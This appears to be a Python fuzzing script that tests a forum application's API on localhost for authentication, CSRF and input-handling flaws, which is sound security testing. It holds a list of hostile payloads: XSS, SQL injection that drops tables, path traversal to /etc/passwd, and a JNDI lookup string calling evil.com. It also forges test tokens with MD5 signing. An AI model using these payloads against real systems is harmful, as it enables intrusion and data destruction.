#!/usr/bin/env python3
"""
Comprehensive API Fuzzing Script for Forum Application

This script fuzzes all API endpoints with various combinations of:
- Valid/invalid authentication tokens
- Valid/invalid/missing CSRF tokens
- Valid/malformed/malicious data payloads
- Different user permission levels
- Database integrity verification

WARNING: This script is destructive and will modify/corrupt data in the database.
Only run this against a test environment.
"""

import asyncio
import aiosqlite
import random
import string
import json
import time
import sys
import hashlib
import hmac
import base64
import uuid
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass
from enum import Enum
import httpx
from datetime import datetime, timezone

# Database configuration
DATABASE_PATH = "forum.db"
API_BASE_URL = "http://localhost:8000"

# Rate limits from config.py (requests, seconds)
RATE_LIMITS = {
    "register": (5, 60),
    "login": (10, 60),
    "edit": (30, 60),
    "post": (20, 60),
    "thread": (10, 60)
}

class FuzzStatus(Enum):
    PASS = "PASS"
    FAIL = "FAIL"
    UNEXPECTED = "UNEXPECTED"
    ERROR = "ERROR"

@dataclass
class FuzzCase:
    name: str
    method: str
    endpoint: str
    requires_auth: bool = False
    requires_csrf: bool = False
    requires_admin: bool = False
    body: Optional[Dict] = None
    expected_status: Union[int, List[int]] = 200
    description: str = ""

@dataclass
class FuzzResult:
    case: FuzzCase
    status_code: int
    response_data: Any
    duration: float
    result: str
    error_message: str = ""

class APIFuzzer:
    def __init__(self, base_url: str = API_BASE_URL, db_path: str = DATABASE_PATH):
        self.base_url = base_url
        self.db_path = db_path
        self.client = httpx.AsyncClient()
        self.db = None

        # Authentication state
        self.valid_tokens = {}
        self.valid_csrf_tokens = {}
        self.session_cookies = {}

        # Test data
        self.test_users = []
        self.test_boards = []
        self.test_threads = []

        # Rate limiting tracker
        self.rate_limit_tracker = {}  # Track requests per endpoint per time window
        self.test_posts = []

        # Results
        self.results = []
        self.vulnerabilities = []

    async def setup_db_connection(self):
        """Setup database connection for verification"""
        self.db = await aiosqlite.connect(self.db_path)
        self.db.row_factory = aiosqlite.Row
        # Configure for better concurrent access
        await self.db.execute("PRAGMA journal_mode = WAL")
        await self.db.execute("PRAGMA busy_timeout = 5000")  # 5 second timeout
        await self.db.commit()

    async def cleanup(self):
        """Cleanup resources"""
        await self.client.aclose()
        if self.db:
            await self.db.close()

    def generate_random_string(self, length: int = 10) -> str:
        """Generate random string for testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_malicious_payloads(self) -> List[str]:
        """Generate various malicious payloads"""
        return [
            "<script>alert('xss')</script>",
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "A" * 10000,  # Buffer overflow attempt
            "\x00\x01\x02",  # Null bytes
            "../../config.py",
            "<iframe src='javascript:alert(1)'></iframe>",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
        ]

    def generate_invalid_tokens(self) -> List[str]:
        """Generate invalid JWT-like tokens"""
        return [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "empty_token",  # Use placeholder instead of empty string
            "null",
            "undefined",
            "Bearer_token",  # Remove space to avoid header issues
            "A" * 500,  # Very long token
            "../../secrets",
        ]

    def generate_jwt_token(self, user_id: int, username: str, is_admin: bool = False) -> str:
        """Generate a JWT token for testing (simplified version)"""
        # This is a basic JWT-like token for testing - in production use proper JWT library
        import base64
        import json

        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "user_id": user_id,
            "username": username,
            "is_admin": is_admin,
            "exp": int(time.time()) + 3600  # 1 hour expiry
        }

        header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')

        # Simple signature (in production, use proper HMAC with secret)
        signature = hashlib.md5(f"{header_b64}.{payload_b64}.test_secret".encode()).hexdigest()[:16]

        return f"{header_b64}.{payload_b64}.{signature}"

    def generate_csrf_token(self) -> str:
        """Generate a CSRF token"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

    async def create_test_users_in_db(self) -> Dict[str, Dict]:
        """Create test users directly in database before API server starts"""
        if not self.db:
            print("No database connection available for creating test users")
            return {}

        # Generate truly unique identifiers using timestamp and UUID
        timestamp = int(time.time())
        unique_id = str(uuid.uuid4())[:8]

        users_data = [
            {
                'type': 'admin',
                'username': f'admin_{timestamp}_{unique_id}',
                'email': f'admin_{timestamp}_{unique_id}@fuzztest.com',
                'is_admin': True,
                'is_banned': False
            },
            {
                'type': 'regular',
                'username': f'user_{timestamp}_{unique_id}',
                'email': f'user_{timestamp}_{unique_id}@fuzztest.com',
                'is_admin': False,
                'is_banned': False
            },
            {
                'type': 'banned',
                'username': f'banned_{timestamp}_{unique_id}',
                'email': f'banned_{timestamp}_{unique_id}@fuzztest.com',
                'is_admin': False,
                'is_banned': True
            }
        ]

        created_users = {}
        print("Creating test users directly in database...")

        for user_data in users_data:
            try:
                # Generate password hash and salt
                password_salt = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                password_hash = hashlib.sha256(("TestPassword123!" + password_salt).encode()).hexdigest()
                current_time = time.time()

                # Insert user directly into database with all required fields
                cursor = await self.db.execute(
                    """INSERT INTO users (
                        username, email, password_hash, password_salt, password_changed_at,
                        is_admin, is_banned, email_verified, join_date, last_activity,
                        post_count, avatar_url, created_at
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (
                        user_data['username'],
                        user_data['email'],
                        password_hash,
                        password_salt,
                        current_time,
                        user_data['is_admin'],
                        user_data['is_banned'],
                        True,  # email_verified
                        current_time,  # join_date
                        current_time,  # last_activity
                        0,  # post_count
                        '',  # avatar_url
                        current_time  # created_at
                    )
                )
                await self.db.commit()
                user_id = cursor.lastrowid

                # Generate JWT token and CSRF token
                jwt_token = self.generate_jwt_token(user_id, user_data['username'], user_data['is_admin'])
                csrf_token = self.generate_csrf_token()

                created_users[user_data['type']] = {
                    'data': {
                        'username': user_data['username'],
                        'email': user_data['email']
                    },
                    'token': jwt_token,
                    'csrf_token': csrf_token,
                    'user_info': {
                        'user_id': user_id,
                        'username': user_data['username'],
                        'email': user_data['email'],
                        'is_admin': user_data['is_admin'],
                        'is_banned': user_data['is_banned']
                    }
                }

                print(f"Created {user_data['type']} user: {user_data['username']} (ID: {user_id})")

            except Exception as e:
                print(f"Failed to create {user_data['type']} user: {e}")

        self.test_users = created_users
        return created_users

    async def load_existing_test_users(self) -> Dict[str, Dict]:
        """Load existing test users from database for fuzzing"""
        if not self.db:
            print("No database connection available")
            return {}

        loaded_users = {}

        try:
            # Find admin users (look for new timestamp-based pattern)
            async with self.db.execute("SELECT user_id, username, email FROM users WHERE is_admin = TRUE AND (username LIKE 'admin_%' OR username LIKE 'admin_%_%') ORDER BY user_id DESC LIMIT 1") as cursor:
                admin_row = await cursor.fetchone()
                if admin_row:
                    user_id, username, email = admin_row
                    jwt_token = self.generate_jwt_token(user_id, username, True)
                    csrf_token = self.generate_csrf_token()
                    loaded_users['admin'] = {
                        'data': {'username': username, 'email': email},
                        'token': jwt_token,
                        'csrf_token': csrf_token,
                        'user_info': {'user_id': user_id, 'username': username, 'email': email, 'is_admin': True, 'is_banned': False}
                    }
                    print(f"Loaded admin user: {username}")

            # Find regular users (look for new timestamp-based pattern)
            async with self.db.execute("SELECT user_id, username, email FROM users WHERE is_admin = FALSE AND is_banned = FALSE AND (username LIKE 'user_%' OR username LIKE 'user_%_%') ORDER BY user_id DESC LIMIT 1") as cursor:
                regular_row = await cursor.fetchone()
                if regular_row:
                    user_id, username, email = regular_row
                    jwt_token = self.generate_jwt_token(user_id, username, False)
                    csrf_token = self.generate_csrf_token()
                    loaded_users['regular'] = {
                        'data': {'username': username, 'email': email},
                        'token': jwt_token,
                        'csrf_token': csrf_token,
                        'user_info': {'user_id': user_id, 'username': username, 'email': email, 'is_admin': False, 'is_banned': False}
                    }
                    print(f"Loaded regular user: {username}")

            # Find banned users (look for new timestamp-based pattern)
            async with self.db.execute("SELECT user_id, username, email FROM users WHERE is_banned = TRUE AND (username LIKE 'banned_%' OR username LIKE 'banned_%_%') ORDER BY user_id DESC LIMIT 1") as cursor:
                banned_row = await cursor.fetchone()
                if banned_row:
                    user_id, username, email = banned_row
                    jwt_token = self.generate_jwt_token(user_id, username, False)
                    csrf_token = self.generate_csrf_token()
                    loaded_users['banned'] = {
                        'data': {'username': username, 'email': email},
                        'token': jwt_token,
                        'csrf_token': csrf_token,
                        'user_info': {'user_id': user_id, 'username': username, 'email': email, 'is_admin': False, 'is_banned': True}
                    }
                    print(f"Loaded banned user: {username}")

        except Exception as e:
            print(f"Error loading test users: {e}")

        if not loaded_users:
            print("❌ No test users found! Run with --setup-users first.")
            return {}

        self.test_users = loaded_users
        return loaded_users

    async def create_test_data(self):
        """Create test boards, threads, and posts"""
        if not self.test_users.get('admin'):
            print("No admin user available for creating test data")
            return

        admin_token = self.test_users['admin']['token']
        admin_csrf = self.test_users['admin']['csrf_token']
        admin_session = self.session_cookies.get('admin')

        headers = {
            'Authorization': f'Bearer {admin_token}',
            'X-CSRF-Token': admin_csrf,
            'Content-Type': 'application/json'
        }
        cookies = {'session_id': admin_session} if admin_session else {}

        # Create test board
        try:
            board_response = await self.client.post(
                f"{self.base_url}/api/boards",
                json={'name': f'Test Board {self.generate_random_string(3)}', 'description': 'Test board for fuzzing'},
                headers=headers,
                cookies=cookies
            )
            if board_response.status_code == 200:
                board_data = board_response.json()
                self.test_boards.append(board_data)
                print(f"Created test board: {board_data.get('name')}")

                # Create test thread
                if self.test_users.get('regular'):
                    regular_token = self.test_users['regular']['token']
                    regular_csrf = self.test_users['regular']['csrf_token']
                    regular_session = self.session_cookies.get('regular')

                    thread_headers = {
                        'Authorization': f'Bearer {regular_token}',
                        'X-CSRF-Token': regular_csrf,
                        'Content-Type': 'application/json'
                    }
                    thread_cookies = {'session_id': regular_session} if regular_session else {}

                    thread_response = await self.client.post(
                        f"{self.base_url}/api/boards/{board_data['board_id']}/threads",
                        json={'title': f'Test Thread {self.generate_random_string(3)}', 'content': 'Test thread content'},
                        headers=thread_headers,
                        cookies=thread_cookies
                    )
                    if thread_response.status_code == 200:
                        thread_data = thread_response.json()
                        self.test_threads.append(thread_data)
                        print(f"Created test thread: {thread_data.get('title')}")

                        # Create test post
                        post_response = await self.client.post(
                            f"{self.base_url}/api/threads/{thread_data['thread_id']}/posts",
                            json={'content': 'Test post content'},
                            headers=thread_headers,
                            cookies=thread_cookies
                        )
                        if post_response.status_code == 200:
                            post_data = post_response.json()
                            self.test_posts.append(post_data)
                            print(f"Created test post: {post_data.get('post_id')}")

        except Exception as e:
            print(f"Error creating test data: {e}")

    def get_test_cases(self) -> List[FuzzCase]:
        """Generate comprehensive test cases with rate limit awareness"""
        cases = []

        # Authentication endpoints - full testing with rate limit awareness
        # Generate truly unique identifiers for registration tests
        test_timestamp = int(time.time())
        test_uuid = str(uuid.uuid4())[:8]

        cases.extend([
            FuzzCase("register_valid", "POST", "/api/auth/register",
                    body={'username': f'fuzztest_{test_timestamp}_{test_uuid}', 'email': f'fuzztest_{test_timestamp}_{test_uuid}@test.com', 'password': 'Password123!'},
                    expected_status=200, description="Valid user registration"),
            FuzzCase("register_xss_username", "POST", "/api/auth/register",
                    body={'username': "<script>alert('xss')</script>", 'email': 'test@test.com', 'password': 'Password123!'},
                    expected_status=422, description="XSS in username"),
            FuzzCase("register_sql_injection", "POST", "/api/auth/register",
                    body={'username': "'; DROP TABLE users; --", 'email': 'test@test.com', 'password': 'Password123!'},
                    expected_status=422, description="SQL injection in username"),
            FuzzCase("register_long_input", "POST", "/api/auth/register",
                    body={'username': 'A' * 1000, 'email': 'test@test.com', 'password': 'Password123!'},
                    expected_status=422, description="Buffer overflow attempt"),
        ])

        # User management endpoints
        if self.test_users:
            user_id = self.test_users.get('regular', {}).get('user_info', {}).get('user_id', 1)
            cases.extend([
                FuzzCase("get_user_no_auth", "GET", f"/api/users/{user_id}",
                        expected_status=401, description="Get user without authentication"),
                FuzzCase("get_user_valid", "GET", f"/api/users/{user_id}", requires_auth=True,
                        expected_status=200, description="Get user with valid auth"),
                FuzzCase("update_user_no_csrf", "PUT", f"/api/users/{user_id}", requires_auth=True,
                        body={'bio': 'Updated bio'}, expected_status=403, description="Update without CSRF token"),
                FuzzCase("update_user_invalid_csrf", "PUT", f"/api/users/{user_id}", requires_auth=True, requires_csrf=True,
                        body={'bio': 'Updated bio'}, expected_status=403, description="Update with invalid CSRF token"),
            ])

        # Board management endpoints
        cases.extend([
            FuzzCase("get_boards", "GET", "/api/boards", expected_status=200, description="Get all boards"),
            FuzzCase("create_board_no_admin", "POST", "/api/boards",
                    body={'name': 'Test Board', 'description': 'Test'}, expected_status=[401, 403], description="Create board without admin"),
            FuzzCase("create_board_xss", "POST", "/api/boards", requires_auth=True, requires_csrf=True, requires_admin=True,
                    body={'name': "<script>alert('xss')</script>", 'description': 'Test'},
                    expected_status=401, description="XSS in board name"),
        ])

        # Thread management endpoints
        if self.test_boards:
            board_id = self.test_boards[0]['board_id']
            cases.extend([
                FuzzCase("get_threads", "GET", f"/api/boards/{board_id}/threads",
                        expected_status=200, description="Get threads from board"),
                FuzzCase("create_thread_no_auth", "POST", f"/api/boards/{board_id}/threads",
                        body={'title': 'Test Thread', 'content': 'Content'}, expected_status=401, description="Create thread without auth"),
                FuzzCase("create_thread_xss_title", "POST", f"/api/boards/{board_id}/threads", requires_auth=True, requires_csrf=True,
                        body={'title': "<script>alert('xss')</script>", 'content': 'Content'},
                        expected_status=422, description="XSS in thread title"),
                FuzzCase("create_thread_invalid_board", "POST", "/api/boards/99999/threads", requires_auth=True, requires_csrf=True,
                        body={'title': 'Test', 'content': 'Content'}, expected_status=404, description="Create thread in non-existent board"),
            ])

        # Post management endpoints
        if self.test_threads:
            thread_id = self.test_threads[0]['thread_id']
            cases.extend([
                FuzzCase("get_posts", "GET", f"/api/threads/{thread_id}/posts",
                        expected_status=200, description="Get posts from thread"),
                FuzzCase("create_post_xss", "POST", f"/api/threads/{thread_id}/posts", requires_auth=True, requires_csrf=True,
                        body={'content': "<script>alert('xss')</script>"},
                        expected_status=200, description="XSS in post content - should be sanitized"),
                FuzzCase("create_post_sql_injection", "POST", f"/api/threads/{thread_id}/posts", requires_auth=True, requires_csrf=True,
                        body={'content': "'; DROP TABLE posts; --"},
                        expected_status=200, description="SQL injection in post content"),
            ])

        # Admin endpoints
        if self.test_users.get('regular'):
            user_id = self.test_users['regular']['user_info']['user_id']
            cases.extend([
                FuzzCase("ban_user_no_admin", "POST", f"/api/admin/users/{user_id}/ban", requires_auth=True, requires_csrf=True,
                        body={'reason': 'Test ban'}, expected_status=403, description="Ban user without admin privileges"),
                FuzzCase("ban_user_xss_reason", "POST", f"/api/admin/users/{user_id}/ban", requires_auth=True, requires_csrf=True, requires_admin=True,
                        body={'reason': "<script>alert('xss')</script>"}, expected_status=200, description="XSS in ban reason"),
            ])

        # Edge cases and boundary testing
        cases.extend([
            FuzzCase("invalid_endpoint", "GET", "/api/nonexistent", expected_status=404, description="Non-existent endpoint"),
            FuzzCase("malformed_json", "POST", "/api/auth/register",
                    body="malformed json", expected_status=422, description="Malformed JSON body"),
            FuzzCase("empty_body", "POST", "/api/auth/register",
                    body={}, expected_status=422, description="Empty request body"),
        ])

        return cases

    async def execute_fuzz_case(self, case: FuzzCase, auth_token: str = None, csrf_token: str = None,
                              session_cookie: str = None, use_invalid_tokens: bool = False) -> FuzzResult:
        """Execute a single fuzz test case with retry logic for rate limiting"""
        return await self._execute_with_retry(case, auth_token, csrf_token, session_cookie, use_invalid_tokens)

    async def _execute_with_retry(self, case: FuzzCase, auth_token: str = None, csrf_token: str = None,
                                session_cookie: str = None, use_invalid_tokens: bool = False,
                                max_retries: int = 3) -> FuzzResult:
        """Execute test case with retry logic for rate limiting"""
        start_time = time.time()

        # Prepare headers
        headers = {'Content-Type': 'application/json'}
        cookies = {}

        # Handle authentication
        if case.requires_auth or auth_token:
            if use_invalid_tokens:
                headers['Authorization'] = f'Bearer {random.choice(self.generate_invalid_tokens())}'
            elif auth_token:
                headers['Authorization'] = f'Bearer {auth_token}'
            else:
                headers['Authorization'] = f'Bearer invalid_token'

        # Handle CSRF token
        if case.requires_csrf or csrf_token:
            if use_invalid_tokens:
                headers['X-CSRF-Token'] = self.generate_random_string(32)
            elif csrf_token:
                headers['X-CSRF-Token'] = csrf_token
            else:
                headers['X-CSRF-Token'] = 'invalid_csrf_token'

        # Handle session cookie
        if session_cookie:
            cookies['session_id'] = session_cookie

        for attempt in range(max_retries + 1):
            try:
                # Execute request
                if case.method.upper() == 'GET':
                    response = await self.client.get(f"{self.base_url}{case.endpoint}", headers=headers, cookies=cookies)
                elif case.method.upper() == 'POST':
                    response = await self.client.post(f"{self.base_url}{case.endpoint}",
                                                    json=case.body, headers=headers, cookies=cookies)
                elif case.method.upper() == 'PUT':
                    response = await self.client.put(f"{self.base_url}{case.endpoint}",
                                                   json=case.body, headers=headers, cookies=cookies)
                elif case.method.upper() == 'PATCH':
                    response = await self.client.patch(f"{self.base_url}{case.endpoint}",
                                                     json=case.body, headers=headers, cookies=cookies)
                elif case.method.upper() == 'DELETE':
                    response = await self.client.delete(f"{self.base_url}{case.endpoint}", headers=headers, cookies=cookies)
                else:
                    raise ValueError(f"Unsupported HTTP method: {case.method}")

                # Check if rate limited and should retry
                if response.status_code == 429 and attempt < max_retries:
                    retry_delay = 2 ** attempt  # Exponential backoff: 1s, 2s, 4s
                    print(f"    Rate limited (429), retrying in {retry_delay}s... (attempt {attempt + 1}/{max_retries + 1})")
                    await asyncio.sleep(retry_delay)
                    continue

                duration = time.time() - start_time

                # Analyze response
                try:
                    response_data = response.json() if response.content else None
                except:
                    response_data = response.text if response.content else None

                # Determine result
                expected_statuses = case.expected_status if isinstance(case.expected_status, list) else [case.expected_status]
                if response.status_code in expected_statuses:
                    result = FuzzStatus.PASS.value
                elif response.status_code in [500, 502, 503, 504]:
                    result = FuzzStatus.ERROR.value
                else:
                    result = FuzzStatus.UNEXPECTED.value

                return FuzzResult(
                    case=case,
                    status_code=response.status_code,
                    response_data=response_data,
                    duration=duration,
                    result=result
                )

            except Exception as e:
                if attempt == max_retries:  # Last attempt failed
                    duration = time.time() - start_time
                    return FuzzResult(
                        case=case,
                        status_code=0,
                        response_data=None,
                        duration=duration,
                        result=FuzzStatus.ERROR.value,
                        error_message=str(e)
                    )
                # If not last attempt, continue to retry

    def get_rate_limit_key(self, endpoint: str, method: str) -> str:
        """Get rate limit key for an endpoint"""
        # Map endpoints to rate limit categories
        if "/api/auth/register" in endpoint:
            return "register"
        elif "/api/auth/login" in endpoint:
            return "login"
        elif method in ["PUT", "PATCH", "DELETE"] and "/api/" in endpoint:
            return "edit"
        elif method == "POST" and "/posts" in endpoint:
            return "post"
        elif method == "POST" and "/threads" in endpoint:
            return "thread"
        else:
            return None  # No rate limit

    async def check_and_wait_for_rate_limit(self, endpoint: str, method: str):
        """Check if we need to wait due to rate limits"""
        rate_limit_key = self.get_rate_limit_key(endpoint, method)
        if not rate_limit_key or rate_limit_key not in RATE_LIMITS:
            return

        max_requests, window_seconds = RATE_LIMITS[rate_limit_key]
        current_time = time.time()

        # Initialize tracker if needed
        if rate_limit_key not in self.rate_limit_tracker:
            self.rate_limit_tracker[rate_limit_key] = []

        requests = self.rate_limit_tracker[rate_limit_key]

        # Remove old requests outside the window
        requests[:] = [req_time for req_time in requests if current_time - req_time < window_seconds]

        # Check if we're at the limit
        if len(requests) >= max_requests:
            # Calculate how long to wait (wait for oldest request to expire)
            oldest_request = min(requests)
            wait_time = window_seconds - (current_time - oldest_request) + 0.1  # Small safety margin
            if wait_time > 0:
                print(f"    Rate limit reached for {rate_limit_key} ({len(requests)}/{max_requests}), waiting {wait_time:.1f}s...")
                await asyncio.sleep(wait_time)
                # Clean up expired requests after waiting
                current_time = time.time()
                requests[:] = [req_time for req_time in requests if current_time - req_time < window_seconds]

    def update_rate_limit_tracker(self, endpoint: str, method: str):
        """Update rate limit tracking after making a request"""
        rate_limit_key = self.get_rate_limit_key(endpoint, method)
        if not rate_limit_key or rate_limit_key not in RATE_LIMITS:
            return

        current_time = time.time()
        if rate_limit_key not in self.rate_limit_tracker:
            self.rate_limit_tracker[rate_limit_key] = []

        self.rate_limit_tracker[rate_limit_key].append(current_time)

    async def verify_database_integrity(self) -> List[Dict]:
        """Check database for potential corruption or injection"""
        if not self.db:
            return []

        issues = []

        # Check for XSS in user data
        async with self.db.execute("SELECT user_id, username, email FROM users") as cursor:
            async for row in cursor:
                for field in ['username', 'email']:
                    value = row[field]
                    if value and ('<script>' in value.lower() or 'javascript:' in value.lower()):
                        issues.append({
                            'type': 'XSS_IN_DATABASE',
                            'table': 'users',
                            'field': field,
                            'user_id': row['user_id'],
                            'value': value
                        })

        # Check for suspicious content in posts
        async with self.db.execute("SELECT post_id, content FROM posts WHERE deleted = FALSE") as cursor:
            async for row in cursor:
                content = row['content']
                if content:
                    if '<script>' in content.lower() or 'javascript:' in content.lower():
                        issues.append({
                            'type': 'XSS_IN_POSTS',
                            'table': 'posts',
                            'post_id': row['post_id'],
                            'content_preview': content[:100]
                        })

        # Check for unusual characters or potential encoding issues
        async with self.db.execute("SELECT COUNT(*) as count FROM users WHERE username LIKE '%\\x00%' OR username LIKE '%\\x01%'") as cursor:
            row = await cursor.fetchone()
            if row and row['count'] > 0:
                issues.append({
                    'type': 'NULL_BYTES_IN_DATA',
                    'table': 'users',
                    'count': row['count']
                })

        return issues

    async def run_comprehensive_fuzzing(self):
        """Run comprehensive fuzzing with all combinations"""
        print("🚀 Starting Comprehensive API Fuzzing")
        print("=" * 50)

        # Setup
        await self.setup_db_connection()

        # Load existing test users from database
        print("📝 Loading test users from database...")
        await self.load_existing_test_users()

        print("📊 Creating test data...")
        await self.create_test_data()

        # Generate test cases
        print("🧪 Generating test cases...")
        test_cases = self.get_test_cases()
        print(f"Generated {len(test_cases)} test cases")

        # Execute tests with different authentication scenarios
        scenarios = [
            ('no_auth', None, None, None),
            ('invalid_tokens', None, None, None),
            ('regular_user', 'regular', 'regular', 'regular'),
            ('admin_user', 'admin', 'admin', 'admin'),
            ('banned_user', 'banned', 'banned', 'banned'),
            ('mixed_tokens', 'regular', 'admin', 'regular'),  # Mixed credentials
            ('expired_session', 'regular', 'regular', None),  # No session cookie
        ]

        print(f"\n🔧 Running {len(test_cases) * len(scenarios)} total test combinations...")

        for scenario_name, auth_user, csrf_user, session_user in scenarios:
            print(f"\n--- Testing scenario: {scenario_name} ---")

            auth_token = self.test_users.get(auth_user, {}).get('token') if auth_user else None
            csrf_token = self.test_users.get(csrf_user, {}).get('csrf_token') if csrf_user else None
            session_cookie = self.session_cookies.get(session_user) if session_user else None

            use_invalid = scenario_name == 'invalid_tokens'

            for i, case in enumerate(test_cases):
                # Check rate limits and wait if necessary
                await self.check_and_wait_for_rate_limit(case.endpoint, case.method)

                result = await self.execute_fuzz_case(
                    case, auth_token, csrf_token, session_cookie, use_invalid
                )
                self.results.append(result)

                # Update rate limit tracking
                self.update_rate_limit_tracker(case.endpoint, case.method)

                # Log interesting results
                if result.result in [FuzzStatus.ERROR.value, FuzzStatus.UNEXPECTED.value]:
                    print(f"  ⚠️  {case.name} ({scenario_name}): {result.status_code} - {result.result}")
                    if result.error_message:
                        print(f"      Error: {result.error_message}")

                # Check for potential vulnerabilities
                expected_statuses = case.expected_status if isinstance(case.expected_status, list) else [case.expected_status]
                if result.status_code == 200 and 200 not in expected_statuses:
                    self.vulnerabilities.append({
                        'case': case.name,
                        'scenario': scenario_name,
                        'issue': f'Unexpected success (expected {case.expected_status}, got 200)',
                        'response': result.response_data
                    })

                # Progress indicator
                if (i + 1) % 10 == 0:
                    print(f"  Progress: {i + 1}/{len(test_cases)} cases completed")

        # Database integrity check
        print("\n🔍 Checking database integrity...")
        db_issues = await self.verify_database_integrity()

        # Generate report
        await self.generate_report(db_issues)

    async def generate_report(self, db_issues: List[Dict]):
        """Generate comprehensive fuzzing report"""
        print("\n" + "=" * 50)
        print("📋 FUZZING REPORT")
        print("=" * 50)

        # Summary statistics
        total_tests = len(self.results)
        passed = len([r for r in self.results if r.result == FuzzStatus.PASS.value])
        failed = len([r for r in self.results if r.result == FuzzStatus.FAIL.value])
        errors = len([r for r in self.results if r.result == FuzzStatus.ERROR.value])
        unexpected = len([r for r in self.results if r.result == FuzzStatus.UNEXPECTED.value])

        print(f"\n📊 SUMMARY:")
        print(f"Total tests executed: {total_tests}")
        print(f"✅ Passed: {passed}")
        print(f"❌ Failed: {failed}")
        print(f"🔥 Errors: {errors}")
        print(f"⚠️  Unexpected: {unexpected}")

        # Vulnerabilities found
        print(f"\n🚨 POTENTIAL VULNERABILITIES: {len(self.vulnerabilities)}")
        for vuln in self.vulnerabilities:
            print(f"  - {vuln['case']} ({vuln['scenario']}): {vuln['issue']}")

        # Database integrity issues
        print(f"\n🗄️  DATABASE ISSUES: {len(db_issues)}")
        for issue in db_issues:
            print(f"  - {issue['type']}: {issue}")

        # Error details
        error_results = [r for r in self.results if r.result == FuzzStatus.ERROR.value]
        if error_results:
            print(f"\n💥 ERROR DETAILS:")
            for result in error_results[:10]:  # Show first 10 errors
                print(f"  - {result.case.name}: {result.error_message}")

        # Unexpected successes (potential auth bypasses)
        auth_bypasses = [r for r in self.results if r.status_code == 200 and
                        (r.case.requires_auth or r.case.requires_admin) and
                        'no_auth' in str(r)]
        if auth_bypasses:
            print(f"\n🔓 POTENTIAL AUTHENTICATION BYPASSES:")
            for result in auth_bypasses:
                print(f"  - {result.case.name}: Got 200 without proper auth")

        # Performance issues
        slow_requests = [r for r in self.results if r.duration > 5.0]
        if slow_requests:
            print(f"\n🐌 SLOW REQUESTS (>5s): {len(slow_requests)}")
            for result in slow_requests:
                print(f"  - {result.case.name}: {result.duration:.2f}s")

        # Save detailed report to file
        report_file = f"fuzz_report_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'summary': {
                    'total_tests': total_tests,
                    'passed': passed,
                    'failed': failed,
                    'errors': errors,
                    'unexpected': unexpected
                },
                'vulnerabilities': self.vulnerabilities,
                'database_issues': db_issues,
                'detailed_results': [
                    {
                        'case_name': r.case.name,
                        'case_description': r.case.description,
                        'method': r.case.method,
                        'endpoint': r.case.endpoint,
                        'expected_status': r.case.expected_status,
                        'actual_status': r.status_code,
                        'result': r.result,
                        'duration': r.duration,
                        'error_message': r.error_message,
                        'response_preview': str(r.response_data)[:200] if r.response_data else None
                    }
                    for r in self.results
                ]
            }, f, indent=2, default=str)

        print(f"\n📄 Detailed report saved to: {report_file}")
        print("\n🏁 Fuzzing completed!")

async def main():
    """Main execution function"""
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python api_fuzzer.py --setup-users         # Create test users in database (API stopped)")
        print("  python api_fuzzer.py --confirm-destructive # Run full fuzzing (API running)")
        return

    if sys.argv[1] == "--setup-users":
        print("⚠️  SETTING UP TEST USERS IN DATABASE")
        print("   Make sure the API server is STOPPED to avoid database lock conflicts!")

        fuzzer = APIFuzzer()
        try:
            await fuzzer.setup_db_connection()
            users = await fuzzer.create_test_users_in_db()
            if users:
                print(f"\n✅ Successfully created {len(users)} test users!")
                print("   Now start the API server and run: python api_fuzzer.py --confirm-destructive")
            else:
                print("❌ Failed to create test users")
        finally:
            await fuzzer.cleanup()

    elif sys.argv[1] == "--confirm-destructive":
        print("⚠️  DESTRUCTIVE TESTING CONFIRMED")
        print("   Make sure test users have been created with --setup-users first!")

        fuzzer = APIFuzzer()
        try:
            await fuzzer.run_comprehensive_fuzzing()
        finally:
            await fuzzer.cleanup()
    else:
        print("Invalid argument. Use --setup-users or --confirm-destructive")

if __name__ == "__main__":
    asyncio.run(main())